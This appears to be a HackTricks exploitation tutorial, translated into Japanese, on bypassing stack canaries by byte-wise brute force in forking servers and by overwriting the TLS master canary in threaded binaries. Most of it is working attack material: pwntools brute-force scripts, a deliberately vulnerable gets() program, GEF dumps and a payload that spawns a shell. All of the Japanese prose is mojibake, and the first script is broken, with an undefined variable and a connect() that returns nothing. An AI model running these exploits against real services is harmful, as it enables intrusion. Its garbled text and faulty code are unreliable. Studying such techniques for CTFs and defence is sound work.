# BF Forked & Threaded Stack Canaries

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**ã‚«ãƒŠãƒªã‚¢ã¨PIEï¼ˆä½ç½®ç‹¬ç«‹å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ï¼‰ã«ã‚ˆã£ã¦ä¿è­·ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã«ç›´é¢ã—ã¦ã„ã‚‹å ´åˆã€ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
**`checksec`** ã¯ã€ãƒã‚¤ãƒŠãƒªãŒã‚«ãƒŠãƒªã‚¢ã«ã‚ˆã£ã¦ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯é™çš„ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ãŠã‚Šã€é–¢æ•°ã‚’ç‰¹å®šã§ããªã„ãŸã‚ã§ã™ã€‚\
ãŸã ã—ã€é–¢æ•°å‘¼ã³å‡ºã—ã®æœ€åˆã«ã‚¹ã‚¿ãƒƒã‚¯ã«å€¤ãŒä¿å­˜ã•ã‚Œã€ã“ã®å€¤ãŒçµ‚äº†å‰ã«ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ã“ã¨ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã§ã€æ‰‹å‹•ã§æ°—ã¥ãã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

## ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚«ãƒŠãƒªã‚¢

å˜ç´”ãªã‚«ãƒŠãƒªã‚¢ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æœ€è‰¯ã®æ–¹æ³•ã¯ã€ãƒã‚¤ãƒŠãƒªãŒ**æ–°ã—ã„æ¥ç¶šã‚’ç¢ºç«‹ã™ã‚‹ãŸã³ã«å­ãƒ—ãƒ­ã‚»ã‚¹ã‚’ãƒ•ã‚©ãƒ¼ã‚¯ã™ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ **ã§ã‚ã‚‹å ´åˆã§ã™ï¼ˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ï¼‰ã€‚ãªãœãªã‚‰ã€æ¥ç¶šã™ã‚‹ãŸã³ã«**åŒã˜ã‚«ãƒŠãƒªã‚¢ãŒä½¿ç”¨ã•ã‚Œã‚‹ã‹ã‚‰ã§ã™**ã€‚

ã—ãŸãŒã£ã¦ã€ã‚«ãƒŠãƒªã‚¢ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æœ€è‰¯ã®æ–¹æ³•ã¯ã€**æ–‡å­—ã”ã¨ã«ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã“ã¨**ã§ã‚ã‚Šã€æ¨æ¸¬ã—ãŸã‚«ãƒŠãƒªã‚¢ãƒã‚¤ãƒˆãŒæ­£ã—ã„ã‹ã©ã†ã‹ã¯ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒã‚¯ãƒ©ãƒƒã‚·ãƒ¥ã—ãŸã‹ã€é€šå¸¸ã®ãƒ•ãƒ­ãƒ¼ã‚’ç¶šã‘ã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§åˆ¤æ–­ã§ãã¾ã™ã€‚ã“ã®ä¾‹ã§ã¯ã€é–¢æ•°ã¯**8ãƒã‚¤ãƒˆã®ã‚«ãƒŠãƒªã‚¢ï¼ˆx64ï¼‰ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—**ã€æ­£ã—ãæ¨æ¸¬ã•ã‚ŒãŸãƒã‚¤ãƒˆã¨ä¸æ­£ãªãƒã‚¤ãƒˆã‚’**ãƒã‚§ãƒƒã‚¯**ã™ã‚‹ã“ã¨ã§åŒºåˆ¥ã—ã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰**ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ãŒè¿”ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ï¼ˆ**ä»–ã®çŠ¶æ³**ã§ã¯**try/except**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼‰ï¼š

### ä¾‹1

ã“ã®ä¾‹ã¯64ãƒ“ãƒƒãƒˆç”¨ã«å®Ÿè£…ã•ã‚Œã¦ã„ã¾ã™ãŒã€32ãƒ“ãƒƒãƒˆç”¨ã«ã‚‚ç°¡å˜ã«å®Ÿè£…ã§ãã¾ã™ã€‚
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### ä¾‹ 2

ã“ã‚Œã¯32ãƒ“ãƒƒãƒˆç”¨ã«å®Ÿè£…ã•ã‚Œã¦ã„ã¾ã™ãŒã€64ãƒ“ãƒƒãƒˆã«ç°¡å˜ã«å¤‰æ›´ã§ãã¾ã™ã€‚\
ã¾ãŸã€ã“ã®ä¾‹ã§ã¯**ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒæœ€åˆã«å…¥åŠ›ã®ã‚µã‚¤ã‚ºã‚’ç¤ºã™ãƒã‚¤ãƒˆ**ã¨ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æœŸå¾…ã—ã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## ã‚¹ãƒ¬ãƒƒãƒ‰

åŒã˜ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚¹ãƒ¬ãƒƒãƒ‰ã¯**åŒã˜ã‚«ãƒŠãƒªã‚¢ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å…±æœ‰**ã™ã‚‹ãŸã‚ã€æ”»æ’ƒãŒç™ºç”Ÿã™ã‚‹ãŸã³ã«ãƒã‚¤ãƒŠãƒªãŒæ–°ã—ã„ã‚¹ãƒ¬ãƒƒãƒ‰ã‚’ç”Ÿæˆã™ã‚‹å ´åˆã€ã‚«ãƒŠãƒªã‚¢ã‚’**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚&#x20;

ã‚«ãƒŠãƒªã‚¢ã§ä¿è­·ã•ã‚ŒãŸã‚¹ãƒ¬ãƒƒãƒ‰é–¢æ•°ã«ãŠã‘ã‚‹ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒã‚¹ã‚¿ãƒ¼ã‚«ãƒŠãƒªã‚¢ã‚’å¤‰æ›´ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ãã®çµæœã€ãƒã‚§ãƒƒã‚¯ã¯åŒã˜ï¼ˆãŸã ã—å¤‰æ›´ã•ã‚ŒãŸï¼‰2ã¤ã®ã‚«ãƒŠãƒªã‚¢ã§ä½¿ç”¨ã•ã‚Œã‚‹ãŸã‚ã€ç·©å’Œç­–ã¯ç„¡æ„å‘³ã§ã™ã€‚

### ä¾‹

æ¬¡ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã«å¯¾ã—ã¦è„†å¼±ã§ã™ãŒã€ã‚«ãƒŠãƒªã‚¢ã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ã„ã¾ã™ï¼š
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
æ³¨æ„ã—ã¦ã»ã—ã„ã®ã¯ã€`vuln`ãŒã‚¹ãƒ¬ãƒƒãƒ‰å†…ã§å‘¼ã³å‡ºã•ã‚Œã¦ã„ã‚‹ã“ã¨ã§ã™ã€‚GDBã§ã¯ã€`vuln`ã‚’è¦‹ã¦ã€ç‰¹ã«ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒå…¥åŠ›ãƒ‡ãƒ¼ã‚¿ã‚’èª­ã¿å–ã‚‹ãŸã‚ã«`gets`ã‚’å‘¼ã³å‡ºã™ãƒã‚¤ãƒ³ãƒˆã‚’ç¢ºèªã§ãã¾ã™:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
ä¸Šè¨˜ã¯ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’æ›¸ãè¾¼ã‚€`data`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã‚¹ã‚¿ãƒƒã‚¯ã‚«ãƒŠãƒªã‚¢ã¯`0x7ffff7d7ee48`ï¼ˆ`0x493fdc653a156800`ï¼‰ã«ã‚ã‚Šã€ãƒªã‚¿ãƒ¼ãƒ³ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯`0x7ffff7d7ee50`ï¼ˆ`0x00007ffff7e17ac3`ï¼‰ã«ã‚ã‚Šã¾ã™ï¼š
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
ã‚¹ã‚¿ãƒƒã‚¯ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå®Ÿéš›ã®ã‚¹ã‚¿ãƒƒã‚¯ã«å±ã—ã¦ã„ãªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼š
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
ã‚¹ãƒ¬ãƒƒãƒ‰ã®ã‚¹ã‚¿ãƒƒã‚¯ã¯ã€ãƒã‚¹ã‚¿ãƒ¼ã‚«ãƒŠãƒªã‚¢ãŒä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã‚¹ãƒ¬ãƒƒãƒ‰ãƒ­ãƒ¼ã‚«ãƒ«ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ï¼ˆTLSï¼‰ã®ä¸Šã«é…ç½®ã•ã‚Œã¾ã™ï¼š
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
ä¸Šè¨˜ã®GDBé–¢æ•°ã®ã„ãã¤ã‹ã¯ã€é€šå¸¸ã® [hugsy/gef](https://github.com/hugsy/gef) ã‚ˆã‚Šã‚‚å¤šãã®æ©Ÿèƒ½ã‚’æŒã¤ [bata24/gef](https://github.com/bata24/gef) ã¨ã„ã†æ‹¡å¼µã«å®šç¾©ã•ã‚Œã¦ã„ã¾ã™ã€‚
{% endhint %}

ãã®çµæœã€å¤§ããªãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã«ã‚ˆã‚Šã€ã‚¹ã‚¿ãƒƒã‚¯ã‚«ãƒŠãƒªã‚¢ã¨TLSå†…ã®ãƒã‚¹ã‚¿ãƒ¼ã‚«ãƒŠãƒªã‚¢ã®ä¸¡æ–¹ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ã“ã‚ŒãŒã‚ªãƒ•ã‚»ãƒƒãƒˆã§ã™:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
ã“ã‚Œã¯`win`ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®çŸ­ã„ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã§ã™ï¼š
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64ãƒ“ãƒƒãƒˆã€PIEãªã—ã€nxã€BFã‚«ãƒŠãƒªã‚¢ã€`execve`ã‚’å‘¼ã³å‡ºã™ROPã‚’ãƒ¡ãƒ¢ãƒªã«æ›¸ãè¾¼ã¿ã€ãã“ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™ã€‚
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* 64ãƒ“ãƒƒãƒˆã€PIEãªã—ã€nxã€ã‚¹ãƒ¬ãƒƒãƒ‰ã¨ãƒã‚¹ã‚¿ãƒ¼ã‚«ãƒŠãƒªã‚¢ã‚’å¤‰æ›´ã—ã¾ã™ã€‚
